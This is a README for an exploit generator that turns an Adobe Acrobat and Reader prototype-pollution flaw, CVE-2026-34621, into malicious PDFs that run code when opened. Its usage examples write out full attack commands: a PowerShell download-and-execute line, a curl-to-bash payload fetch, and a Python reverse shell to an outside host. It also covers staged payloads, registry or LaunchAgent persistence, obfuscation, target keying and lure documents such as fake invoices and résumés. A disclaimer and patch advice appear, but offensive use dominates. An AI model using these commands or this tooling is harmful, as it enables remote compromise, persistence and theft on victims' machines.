# CVE-2026-34621 Advanced Exploit Generator

[![Python 3.7+](https://img.shields.io/badge/python-3.7+-blue.svg)](https://www.python.org/)
[![License](https://img.shields.io/badge/license-Educational%20Use%20Only-red.svg)](LICENSE)

A sophisticated, cross-platform exploit generator for **CVE-2026-34621** – a critical prototype pollution vulnerability in Adobe Acrobat and Reader that leads to sandbox escape and arbitrary code execution on Windows and macOS.

> **⚠️ IMPORTANT DISCLAIMER**  
> This tool is intended **only for authorized security research and penetration testing**.  
> Unauthorized use against systems you do not own or have explicit written permission to test is **illegal**. The author assumes no liability for misuse.

---

## 📋 Table of Contents

- [Overview](#overview)
- [Features](#features)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Usage Examples](#usage-examples)
  - [Windows Commands](#windows-commands)
  - [macOS Commands](#macos-commands)
  - [Mobile Testing](#mobile-testing-note)
- [Command-Line Options](#command-line-options)
- [How It Works](#how-it-works)
- [Affected Versions](#affected-versions)
- [Mitigation](#mitigation)
- [Contributing](#contributing)
- [License](#license)

---

## 🔍 Overview

**CVE-2026-34621** is a zero-day vulnerability in Adobe Acrobat and Reader that allows an attacker to:

1. Pollute the JavaScript object prototype within Adobe's engine.
2. Bypass the security sandbox.
3. Execute arbitrary system commands on the victim's machine.

This generator creates a malicious PDF file that, when opened in a vulnerable version of Adobe Reader, automatically executes a payload tailored to the victim's operating system.

**Supported Target Platforms:**
- ✅ Windows (full arbitrary code execution)
- ✅ macOS (full arbitrary code execution)
- ❌ Android / iOS (not vulnerable – demo fallback only)

---

## ✨ Features

| Category | Capabilities |
|----------|--------------|
| **Cross‑Platform Payloads** | Auto-detects OS and selects appropriate Windows or macOS command execution method. |
| **Multiple Execution Vectors** | `cmd.exe`, PowerShell, WScript.Shell (Windows) / Terminal.app, `osascript` (macOS). |
| **Staged Payloads** | Download and execute second‑stage payloads from a remote URL. |
| **Persistence** | Install registry Run key (Windows) or LaunchAgent (macOS). |
| **Evasion Techniques** | Three levels of JavaScript obfuscation, environment keying, execution delays, polymorphic code. |
| **Lure PDF Embedding** | Merge the exploit into a legitimate‑looking PDF (requires PyPDF2). |
| **Multiple Triggers** | OpenAction, page‑open action, or document‑level JavaScript. |
| **Comprehensive Reporting** | HTML, TXT, and JSON reports detailing payload configuration. |

---

## 📦 Installation

### 1. Clone the Repository

```bash
git clone https://github.com/NULL200OK/CVE-2026-34621-Exploit.git
cd CVE-2026-34621-Exploit
```
### 2. (Optional) Create a Virtual Environment
```bash
python3 -m venv venv
source venv/bin/activate      # Linux/macOS
venv\Scripts\activate         # Windows
```
### 3. Install Dependencies

The core script uses only the Python standard library. For the lure PDF merging feature, install PyPDF2:

```bash
pip install PyPDF2
```

## 🚀 Quick Start

Generate a basic PDF that opens the calculator on both Windows and macOS:

```bash
python3 cve_2026_34621_advanced.py -o test.pdf
```
**This creates:**

test.pdf – The malicious PDF file.

test_report.html – Detailed HTML report.

test_report.txt – Plain text summary.

test_config.json – JSON configuration export.

## 💻 Usage Examples

**Windows Commands**

**1-Scenario	Command**

A-Basic calc.exe popup
```bash
python cve_2026_34621_advanced.py -o invoice.pdf --win calc.exe
```

PowerShell reverse shell
```bash
python cve_2026_34621_advanced.py -o contract.pdf --win "powershell -NoP -Ep Bypass -C \"IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.5/shell.ps1')\""
```
Staged payload with persistence
```bash
python cve_2026_34621_advanced.py -o resume.pdf --win calc.exe --stage http://192.168.1.100/payload.exe -p
```
Environment‑keyed (only run on "SALES-PC")
```bash
python cve_2026_34621_advanced.py -o targeted.pdf --win calc.exe -k SALES-PC
```
With obfuscation level 2 and 10‑second delay
```bash
python cve_2026_34621_advanced.py -o delayed.pdf --win calc.exe -O 2 -d 10
```
**macOS Commands**

**2-Scenario	Command**

Open Calculator
```bash
python cve_2026_34621_advanced.py -o invoice.pdf --mac "open /System/Applications/Calculator.app"
```
Download and execute script	
```bash
python cve_2026_34621_advanced.py -o update.pdf --mac "curl -s http://10.0.0.5/mac_payload.sh | bash"
```
Reverse shell via Python
```bash
python cve_2026_34621_advanced.py -o shell.pdf --mac "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.5\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
```
Persistence via LaunchAgent
```bash
python cve_2026_34621_advanced.py -o persist.pdf --mac "open /Applications/Calculator.app" -p
```
Embedding in a Lure PDF
```bash
python cve_2026_34621_advanced.py -o safe_invoice.pdf -l /path/to/real_invoice.pdf --trigger pageopen
```
**3-Mobile Testing Note**

The script itself runs on desktop (Windows/macOS/Linux) to generate the PDF. The generated PDF can be opened on Android or iOS devices, but:

Mobile versions of Adobe Acrobat Reader are not vulnerable to CVE-2026-34621.

The payload will trigger a benign demo fallback (opens a URL or shows an alert) instead of executing system commands.

## 📖 Command-Line Options

**Option	Description**

**-o**, **--output** FILE	Required. Output PDF filename.

**--win** CMD	Windows command to execute (default: calc.exe).

**--mac** CMD	macOS command to execute (default: open /System/Applications/Calculator.app).

**--stage URL**	URL to download second‑stage payload from.

**-p**, **--persistence**	Install persistence mechanism (Registry/LanchAgent).

**-O**, **--obfuscate** LEVEL	JavaScript obfuscation level (0=none, 1=basic, 2=intermediate, 3=advanced).

**-d**, **--delay** SECONDS	Delay execution by specified seconds.

**-k**, **--key** HOSTNAME	Environment keying – only execute on matching hostname.

**-l**, **--lure** PDF	Path to a legitimate PDF to use as a lure (merges exploit).

**--trigger TYPE**	Trigger vector: openaction, pageopen, or doclevel.

**--no-reports**	Skip generating HTML/TXT/JSON reports.

**--seed N**	Set random seed for reproducible polymorphic generation.

## ⚙️ How It Works

**Attack Chain**

**Prototype Pollution:**

The embedded JavaScript modifies Object.prototype to inject malicious properties (__trusted, privileged, etc.). This confuses Adobe's JavaScript engine trust boundary.

**Context Escalation**

Because of the polluted prototype, the engine incorrectly treats untrusted document JavaScript as if it were running in a privileged context.

**Privileged API Access**

The script can now call restricted APIs such as app.launchURL, util.readFileIntoStream, and app.trustedFunction.

**Sandbox Escape**

These APIs allow file system access and process execution outside the Adobe sandbox.

**Arbitrary Code Execution**

The script executes the attacker's command using OS‑specific methods:

Windows: cmd.exe /c, PowerShell, or WScript.Shell.

macOS: Terminal.app URL handler or osascript.

**Obfuscation Levels**

Level	Description

**0**	No obfuscation – plain readable JavaScript.

**1**	String literals converted to String.fromCharCode, variable names randomized.

**2**	Level 1 + dead code injection and junk comments.

**3**	Entire script base64‑encoded and wrapped in eval(atob(...)), then re‑obfuscated.

## 🛡️ Affected Versions

Product	Track	Vulnerable Versions	Patched Version

Adobe Acrobat DC	Continuous	≤ 26.001.21367	26.001.21411

Adobe Acrobat Reader DC	Continuous	≤ 26.001.21367	26.001.21411

Adobe Acrobat 2024	Classic	≤ 24.001.30356	24.001.30362 (Win) / 24.001.30360 (macOS)

## 🛠️ Mitigation

Update Immediately: Apply the latest security updates from Adobe.

Disable JavaScript in Adobe Reader: Edit → Preferences → JavaScript → uncheck "Enable Acrobat JavaScript" (note: this breaks some PDF functionality).

Use Alternative PDF Viewers: Consider using browsers or third‑party viewers that are not affected.

## 🤝 Contributing

Contributions are welcome, but please note:

All pull requests must be for defensive research, detection improvements, or reporting enhancements.

We do not accept contributions that increase the offensive capability of the tool beyond what is necessary for legitimate testing.

To contribute:

Fork the repository.

Create a feature branch.

Submit a pull request with a clear description of changes.

## 📄 License
This project is provided for educational and authorized security testing purposes only.

By using this software, you agree that you are responsible for complying with all applicable laws and regulations.

The author disclaims all liability for any misuse or damage caused by this tool.
